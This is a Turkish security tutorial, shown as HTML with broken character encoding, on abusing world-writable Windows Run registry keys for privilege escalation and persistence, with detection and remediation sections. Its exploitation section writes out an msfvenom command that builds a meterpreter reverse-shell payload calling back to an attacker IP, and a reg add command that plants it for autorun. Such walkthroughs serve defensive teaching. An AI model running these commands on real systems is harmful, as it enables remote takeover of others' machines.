I"Ø<h2 id="Ã¶zet">Ã–zet</h2>

<p>Windows sistemlerde yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ kayÄ±t defteri kayÄ±tlarÄ± bulunabilir. Standart kurulumlarda sÄ±klÄ±kla karÅŸÄ±laÅŸÄ±lan bir durum olmasa da kullanÄ±cÄ±lar bazen izinleri yanlÄ±ÅŸ yapÄ±landÄ±rarak, kÃ¶tÃ¼ niyetli kiÅŸilere yeni ayrÄ±calÄ±klar elde etmek iÃ§in bir yol aÃ§mÄ±ÅŸ olabilirler. Bazen bu izinler kullanÄ±larak yeni ayrÄ±calÄ±klar elde edilebilir.</p>

<h2 id="detay">Detay</h2>

<p>Ã–zetle bazÄ± anahtarlar yÃ¶netici olmayan kullanÄ±cÄ±lar tarafÄ±ndan deÄŸiÅŸtirilebilir olduÄŸunda bu anahtarlar manipÃ¼le edilerek sistemde yetki yÃ¼kseltilebilir ve sistemde kalÄ±cÄ±lÄ±k saÄŸlanabilir.</p>

<p>Ã–rnek olarak AutoRun Ã¶zelliÄŸini aktifleÅŸtiren anahtarlar verilebilir. AÅŸaÄŸÄ±da sistemin her aÃ§Ä±lÄ±ÅŸÄ±nda otomatik olarak baÅŸlatacaÄŸÄ± uygulamalarÄ±n belirlendiÄŸi kayÄ±t bÃ¶lÃ¼mÃ¼ olan Run kaydÄ±nÄ±n herkes tarafÄ±ndan dÃ¼zenlenebildiÄŸi gÃ¶sterilmiÅŸtir.</p>

<p align="center">
	<img src="/images/modifiable_registry_autoRun_keys_ss/1.png" alt="" />
</p>

<h2 id="bulunmasÄ±">BulunmasÄ±</h2>

<p>YanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ kayÄ±t defteri izinlerini otomatik olarak bulmak iÃ§in DazzleUp kullanÄ±labilir. DazzleUpâ€™Ä±n yanlÄ±ÅŸ yapÄ±landÄ±rma iÃ§in oluÅŸturduÄŸu Ã§Ä±ktÄ±nÄ±n ekran gÃ¶rÃ¼ntÃ¼sÃ¼ aÅŸaÄŸÄ±da verilmiÅŸtir.</p>

<p align="center">
	<img src="/images/modifiable_registry_autoRun_keys_ss/2.png" alt="" />
</p>

<p>YanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ kayÄ±t defteri iznini bulmak iÃ§in sysinternal araÃ§larÄ±ndan olan accesschk.exe kullanÄ±labilir. HKLM altÄ±nda yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ bir kayÄ±t bulmak iÃ§in;</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">Accesschk64.exe</span><span class="w"> </span><span class="err">â€œ</span><span class="nx">Everyone</span><span class="err">â€</span><span class="w"> </span><span class="nt">-kvuqsw</span><span class="w"> </span><span class="nx">HKLM\</span><span class="w">
</span></code></pre></div></div>
<p>komutunu kullanarak Everyoneâ€™Ä±n deÄŸiÅŸiklik yapma iznine sahip olduÄŸu tÃ¼m kayÄ±tlarÄ± listeleyebiliriz. AÅŸaÄŸÄ±da yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ kayÄ±t gÃ¶sterilmiÅŸtir.</p>

<p align="center">
	<img src="/images/modifiable_registry_autoRun_keys_ss/3.png" alt="" />
</p>

<p>YanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ kaydÄ± detaylÄ± incelemek iÃ§in;</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">Get-Acl</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">Format-List</span><span class="w">
</span></code></pre></div></div>
<p>komutu kullanÄ±labilir.
Ekran gÃ¶rÃ¼ntÃ¼sÃ¼nden gÃ¶rÃ¼ldÃ¼ÄŸÃ¼ Ã¼zere ilgili kayÄ±t NT AUTHORITY\SYSTEM grubuna dahil olup <strong>Everyone</strong> tarafÄ±ndan tam eriÅŸime sahip.</p>

<p align="center">
	<img src="/images/modifiable_registry_autoRun_keys_ss/4.png" alt="" />
</p>

<h2 id="iÌ‡stismar-edilmesi">Ä°stismar Edilmesi</h2>
<p>ZararlÄ± yazÄ±lÄ±m Ã¼retilerek sisteme yÃ¼klenecektir. ZararlÄ±nÄ±n Ã¼retildiÄŸine dair ekran gÃ¶rÃ¼ntÃ¼sÃ¼ aÅŸaÄŸÄ±da verilmiÅŸtir.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">--platform</span> windows <span class="nt">-a</span> x64 <span class="nt">-p</span> windows/x64/meterpreter/reverse_tcp <span class="nv">LHOST</span><span class="o">=</span>192.168.6.182 <span class="nv">LPORT</span><span class="o">=</span>445 <span class="nt">-f</span> exe <span class="nt">-o</span> cmd.exe
</code></pre></div></div>

<p align="center">
	<img src="/images/modifiable_registry_autoRun_keys_ss/5.png" alt="" />
</p>

<p>Ä°lgili dosyanÄ±n hedef makineye daha Ã¶nceden elde edilmiÅŸ bir oturum Ã¼zerinden yÃ¼klenmesine dair ekran gÃ¶rÃ¼ntÃ¼sÃ¼ aÅŸaÄŸÄ±da verilmiÅŸtir.</p>

<p align="center">
	<img src="/images/modifiable_registry_autoRun_keys_ss/6.png" alt="" />
</p>

<p>Bu kayÄ±t bÃ¶lÃ¼mÃ¼nde herkes deÄŸiÅŸiklik yapabildiÄŸi iÃ§in;</p>

<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nf">Reg</span><span class="w"> </span><span class="nx">add</span><span class="w"> </span><span class="err">â€œ</span><span class="nx">HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run</span><span class="err">â€</span><span class="w"> </span><span class="nx">/t</span><span class="w"> </span><span class="nx">REG_EXPAND_SZ</span><span class="w"> </span><span class="nx">/v</span><span class="w"> </span><span class="nx">Insecure</span><span class="w"> </span><span class="nx">/d</span><span class="w"> </span><span class="err">â€œ</span><span class="nx">C:\Users\test\Desktop\cmd.exe</span><span class="err">â€</span><span class="w">
</span></code></pre></div></div>
<p>komutunu girerek zararlÄ± yazÄ±lÄ±mÄ± her oturum aÃ§Ä±lÄ±ÅŸÄ±nda Ã§alÄ±ÅŸtÄ±rÄ±lacak ÅŸekilde ayarlamÄ±ÅŸ bulunuyoruz. Anahtara zararlÄ± yazÄ±lÄ±mÄ±n tam yolunun verildiÄŸine dair ekran gÃ¶rÃ¼ntÃ¼sÃ¼ aÅŸaÄŸÄ±da verilmiÅŸtir.</p>

<p align="center">
	<img src="/images/modifiable_registry_autoRun_keys_ss/7.png" alt="" />
</p>

<p>Sonraki oturum aÃ§Ä±lÄ±ÅŸÄ±nda, oturum aÃ§an kullanÄ±cÄ± ayrÄ±calÄ±klarÄ±nda uzaktan eriÅŸim elde edilecektir. Administrator kullanÄ±cÄ±sÄ± oturum aÃ§tÄ±ÄŸÄ±nda elde edilen uzaktan eriÅŸim oturumu aÅŸaÄŸÄ±da ki ekran gÃ¶rÃ¼ntÃ¼sÃ¼nde gÃ¶sterilmiÅŸtir.</p>

<p align="center">
	<img src="/images/modifiable_registry_autoRun_keys_ss/8.png" alt="" />
</p>

<h2 id="Ã§Ã¶zÃ¼m">Ã‡Ã¶zÃ¼m</h2>

<p>HatalÄ± yapÄ±landÄ±rmayÄ± gidermek iÃ§in, yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸ kaydÄ±n izinler bÃ¶lÃ¼mÃ¼nde dÃ¼zenleme yapÄ±lmalÄ±dÄ±r. Ä°zinlerin nereden deÄŸiÅŸtirileceÄŸi aÅŸaÄŸÄ±da ki ekran gÃ¶rÃ¼ntÃ¼lerinde gÃ¶sterilmiÅŸtir.</p>

<p align="center">
	<img src="/images/modifiable_registry_autoRun_keys_ss/9.png" alt="" />
</p>

<p align="center">
	<img src="/images/modifiable_registry_autoRun_keys_ss/10.png" alt="" />
</p>

<p>YanlÄ±ÅŸ yapÄ±landÄ±rmanÄ±n dÃ¼zeldiÄŸine dair ekran gÃ¶rÃ¼ntÃ¼sÃ¼ aÅŸaÄŸÄ±da verilmitir.</p>

<p align="center">
	<img src="/images/modifiable_registry_autoRun_keys_ss/11.png" alt="" />
</p>

<h2 id="kaynakÃ§a">KaynakÃ§a</h2>

<ul>
  <li>https://en.wikipedia.org/wiki/Windows_Registry</li>
  <li>https://docs.microsoft.com/en-us/windows/win32/setupapi/run-and-runonce-registry-keys</li>
  <li>https://github.com/hlldz/dazzleUP</li>
  <li>https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</li>
</ul>
:ET